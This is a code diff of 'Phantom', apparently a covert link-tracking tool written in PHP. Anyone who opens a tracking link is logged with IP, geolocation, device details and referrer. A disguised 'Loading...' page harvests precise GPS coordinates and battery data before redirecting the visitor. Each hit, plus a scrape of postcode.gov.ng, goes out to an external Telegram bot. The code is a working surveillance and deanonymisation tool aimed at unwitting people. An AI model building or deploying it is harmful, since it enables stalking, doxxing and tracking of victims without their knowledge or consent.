@@ -1,24 +1,29 @@
 <?php
-// track.php - Phantom core logger
+/**
+ * Phantom – Core Tracker
+ * Logs IP, geo, device data + attempts precise location + postcode.gov.ng scrape
+ * Sends full report to Telegram
+ */
+
 $config = require __DIR__ . '/config.php';
 
-header('Access-Control-Allow-Origin: *');
-header('Cache-Control: no-store, no-cache, must-revalidate');
-
-$trackId = isset($_GET['id']) ? preg_replace('/[^a-zA-Z0-9_-]/', '', $_GET['id']) : null;
-$redirect = isset($_GET['r']) ? $_GET['r'] : $config['default_redirect'];
-
-if (!$trackId) {
-    header('Location: /');
-    exit;
-}
+// =====================================================
+// Helper Functions
+// =====================================================
 
 function getRealIP() {
-    $headers = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'];
-    foreach ($headers as $h) {
-        if (!empty($_SERVER[$h])) {
-            $ip = trim(explode(',', $_SERVER[$h])[0]);
-            if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
+    $headers = [
+        'HTTP_CF_CONNECTING_IP',
+        'HTTP_X_FORWARDED_FOR',
+        'HTTP_X_REAL_IP',
+        'REMOTE_ADDR'
+    ];
+    foreach ($headers as $header) {
+        if (!empty($_SERVER[$header])) {
+            $ip = trim(explode(',', $_SERVER[$header])[0]);
+            if (filter_var($ip, FILTER_VALIDATE_IP)) {
+                return $ip;
+            }
         }
     }
     return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
@@ -27,35 +32,87 @@ function getRealIP() {
 function sendTelegram($message) {
     global $config;
     if (empty($config['telegram']['enabled'])) return;
+
     $token = $config['telegram']['bot_token'] ?? '';
     $chat  = $config['telegram']['chat_id'] ?? '';
     if (!$token || !$chat) return;
 
     $url = "https://api.telegram.org/bot{$token}/sendMessage";
+
     $ch = curl_init($url);
     curl_setopt_array($ch, [
-        CURLOPT_POST => true,
-        CURLOPT_POSTFIELDS => [
-            'chat_id' => $chat,
-            'text' => $message,
-            'parse_mode' => 'HTML',
+        CURLOPT_POST           => true,
+        CURLOPT_POSTFIELDS     => [
+            'chat_id'                  => $chat,
+            'text'                     => $message,
+            'parse_mode'               => 'HTML',
             'disable_web_page_preview' => true
         ],
         CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_TIMEOUT => 4
+        CURLOPT_TIMEOUT        => 6,
+        CURLOPT_CONNECTTIMEOUT => 4
     ]);
     curl_exec($ch);
     curl_close($ch);
 }
 
-$ip = getRealIP();
-$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
-$ref = $_SERVER['HTTP_REFERER'] ?? '';
-$lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '';
-$time = date('Y-m-d H:i:s');
+function fetchPostcodeHtml($lat, $lon) {
+    // Try to request the find page (best effort)
+    // Note: postcode.gov.ng may require interaction, this is a best-effort scrape
+    $url = "https://postcode.gov.ng/find";
 
-// Geo IP
-$geo = ['country'=>'','region'=>'','city'=>'','zip'=>'','lat'=>'','lon'=>'','isp'=>'','org'=>'','as'=>'','proxy'=>false,'mobile'=>false];
+    $ch = curl_init($url);
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_TIMEOUT        => 8,
+        CURLOPT_USERAGENT      => 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
+        CURLOPT_HTTPHEADER     => [
+            'Accept: text/html,application/xhtml+xml',
+            'Accept-Language: en-NG,en;q=0.9'
+        ]
+    ]);
+    $html = curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+
+    if ($httpCode >= 200 && $httpCode < 400 && $html) {
+        // Return a shortened version to avoid huge Telegram messages
+        $clean = preg_replace('/\s+/', ' ', strip_tags($html));
+        return substr($clean, 0, 1200);
+    }
+    return null;
+}
+
+// =====================================================
+// Main Logic
+// =====================================================
+
+header('Access-Control-Allow-Origin: *');
+header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
+header('Pragma: no-cache');
+
+$trackId  = isset($_GET['id']) ? preg_replace('/[^a-zA-Z0-9_-]/', '', $_GET['id']) : null;
+$redirect = isset($_GET['r']) ? $_GET['r'] : ($config['default_redirect'] ?? 'https://www.google.com');
+
+if (!$trackId) {
+    header('Location: /');
+    exit;
+}
+
+$ip      = getRealIP();
+$ua      = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$referer = $_SERVER['HTTP_REFERER'] ?? '';
+$lang    = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '';
+$time    = date('Y-m-d H:i:s');
+
+// ---------- Geo from IP ----------
+$geo = [
+    'country' => '', 'region' => '', 'city' => '', 'zip' => '',
+    'lat' => '', 'lon' => '', 'isp' => '', 'org' => '', 'as' => '',
+    'proxy' => false, 'mobile' => false
+];
+
 $geoJson = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,proxy,hosting,mobile");
 if ($geoJson) {
     $g = json_decode($geoJson, true);
@@ -70,22 +127,24 @@ if ($geoJson) {
             'isp'     => $g['isp'] ?? '',
             'org'     => $g['org'] ?? '',
             'as'      => $g['as'] ?? '',
-            'proxy'   => ($g['proxy'] ?? false) || ($g['hosting'] ?? false),
-            'mobile'  => $g['mobile'] ?? false
+            'proxy'   => !empty($g['proxy']) || !empty($g['hosting']),
+            'mobile'  => !empty($g['mobile'])
         ];
     }
 }
 
-// Simpan log
+// ---------- Save log ----------
 $logDir = __DIR__ . '/logs';
-if (!is_dir($logDir)) mkdir($logDir, 0755, true);
+if (!is_dir($logDir)) {
+    mkdir($logDir, 0755, true);
+}
 $logFile = $logDir . '/' . $trackId . '.json';
 
 $entry = [
     'time'    => $time,
     'ip'      => $ip,
     'ua'      => $ua,
-    'referer' => $ref,
+    'referer' => $referer,
     'lang'    => $lang,
     'geo'     => $geo,
     'precise' => null,
@@ -93,98 +152,102 @@ $entry = [
     'battery' => null
 ];
 
-$logs = file_exists($logFile) ? (json_decode(file_get_contents($logFile), true) ?: []) : [];
+$logs = [];
+if (file_exists($logFile)) {
+    $logs = json_decode(file_get_contents($logFile), true) ?: [];
+}
 $logs[] = $entry;
 file_put_contents($logFile, json_encode($logs, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
 
-// === TELEGRAM NOTIF OTOMATIS ===
+// ---------- Telegram notification ----------
 $proxyFlag = $geo['proxy'] ? '⚠️ PROXY/VPN' : '✅ Clean';
-$msg = "👻 <b>Phantom Hit</b>\n";
+$msg  = "👻 <b>Phantom Hit</b>\n";
 $msg .= "ID: <code>{$trackId}</code>\n";
 $msg .= "Time: {$time}\n";
 $msg .= "IP: <code>{$ip}</code>\n";
-$msg .= "Loc: {$geo['city']}, {$geo['region']}, {$geo['country']}\n";
-$msg .= "ZIP: {$geo['zip']}\n";
-$msg .= "ISP: {$geo['isp']}\n";
+$msg .= "Loc: " . trim(($geo['city'] ? $geo['city'] . ', ' : '') . ($geo['region'] ? $geo['region'] . ', ' : '') . $geo['country']) . "\n";
+$msg .= "ZIP: " . ($geo['zip'] ?: '-') . "\n";
+$msg .= "ISP: " . ($geo['isp'] ?: '-') . "\n";
 $msg .= "{$proxyFlag}\n";
-$msg .= "UA: " . substr($ua, 0, 80) . "...\n";
-$msg .= "🔗 <a href=\"{$config['domain']}/liveview.php?id={$trackId}\">Live View</a>";
+$msg .= "UA: " . substr($ua, 0, 90) . (strlen($ua) > 90 ? '...' : '') . "\n";
+$msg .= "🔗 <a href=\"" . rtrim($config['domain'], '/') . "/liveview.php?id={$trackId}\">Open Live View</a>";
+
 sendTelegram($msg);
 
-// JS beacon request
-if (isset($_GET['js']) || (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest')) {
-    // Update last entry with precise data if posted
+// =====================================================
+// Handle JS beacon (precise data from track.js)
+// =====================================================
+$isJsRequest = isset($_GET['js']) || 
+               (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') ||
+               $_SERVER['REQUEST_METHOD'] === 'POST';
+
+if ($isJsRequest) {
     $input = json_decode(file_get_contents('php://input'), true);
-    if ($input) {
-        $logs[count($logs)-1] = array_merge($logs[count($logs)-1], $input);
+
+    if (is_array($input) && !empty($logs)) {
+        $lastIndex = count($logs) - 1;
+        $logs[$lastIndex] = array_merge($logs[$lastIndex], $input);
         file_put_contents($logFile, json_encode($logs, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
-        
-        // Extra notif kalau dapat precise location
-        if (!empty($input['precise']['lat'])) {
+
+        // If we got precise coordinates → try postcode scrape + extra Telegram
+        if (!empty($input['precise']['lat']) && !empty($input['precise']['lon'])) {
             $p = $input['precise'];
-            sendTelegram("📍 <b>Precise Location</b>\nID: <code>{$trackId}</code>\nLat: {$p['lat']}\nLon: {$p['lon']}\nAccuracy: {$p['accuracy']}m");
+            $extra  = "📍 <b>Precise Location Received</b>\n";
+            $extra .= "ID: <code>{$trackId}</code>\n";
+            $extra .= "Lat: <code>{$p['lat']}</code>\n";
+            $extra .= "Lon: <code>{$p['lon']}</code>\n";
+            $extra .= "Accuracy: " . ($p['accuracy'] ?? '?') . " m\n";
+
+            if (!empty($config['enable_postcode_scrape'])) {
+                $htmlSnippet = fetchPostcodeHtml($p['lat'], $p['lon']);
+                if ($htmlSnippet) {
+                    $extra .= "\n📄 <b>postcode.gov.ng response (snippet):</b>\n";
+                    $extra .= "<code>" . htmlspecialchars(substr($htmlSnippet, 0, 800)) . "</code>";
+                } else {
+                    $extra .= "\n📄 postcode.gov.ng: no usable HTML returned";
+                }
+            }
+
+            sendTelegram($extra);
         }
     }
+
     header('Content-Type: application/json');
     echo json_encode(['ok' => true]);
     exit;
 }
 
-// Halaman loading + coba geolocation
+// =====================================================
+// Normal browser visit → show loading page + load track.js
+// =====================================================
 ?>
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Phantom</title>
-<style>
-body{margin:0;background:#0b0b0f;color:#e0e0e0;font-family:system-ui,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh}
-.loader{text-align:center;opacity:0.6}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            margin: 0;
+            background: #07070b;
+            color: #888;
+            font-family: system-ui, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            font-size: 0.95rem;
+        }
+    </style>
 </head>
 <body>
-<div class="loader"><p>Loading...</p></div>
-<script>
-(function(){
-  const trackId = <?= json_encode($trackId) ?>;
-  const redirect = <?= json_encode($redirect) ?>;
-  const logUrl = location.pathname + '?id=' + encodeURIComponent(trackId) + '&js=1';
+    <div>Loading...</div>
 
-  function send(data) {
-    const blob = new Blob([JSON.stringify(data)], {type:'application/json'});
-    if (navigator.sendBeacon) navigator.sendBeacon(logUrl, blob);
-    else fetch(logUrl, {method:'POST', body:blob, keepalive:true}).catch(()=>{});
-  }
-
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(
-      pos => {
-        send({
-          precise: {
-            lat: pos.coords.latitude,
-            lon: pos.coords.longitude,
-            accuracy: pos.coords.accuracy
-          },
-          screen: screen.width + 'x' + screen.height
-        });
-        setTimeout(() => location.replace(redirect), 350);
-      },
-      err => {
-        send({precise:null, screen: screen.width + 'x' + screen.height, error: err.message});
-        location.replace(redirect);
-      },
-      {enableHighAccuracy:true, timeout:7000, maximumAge:0}
-    );
-  } else {
-    send({precise:null, screen: screen.width + 'x' + screen.height});
-    location.replace(redirect);
-  }
-
-  if (navigator.getBattery) {
-    navigator.getBattery().then(b => send({battery:{level:b.level, charging:b.charging}})).catch(()=>{});
-  }
-})();
-</script>
+    <script>
+        window.PHANTOM_ID = <?= json_encode($trackId) ?>;
+        window.PHANTOM_REDIRECT = <?= json_encode($redirect) ?>;
+    </script>
+    <script src="assets/js/track.js"></script>
 </body>
 </html>
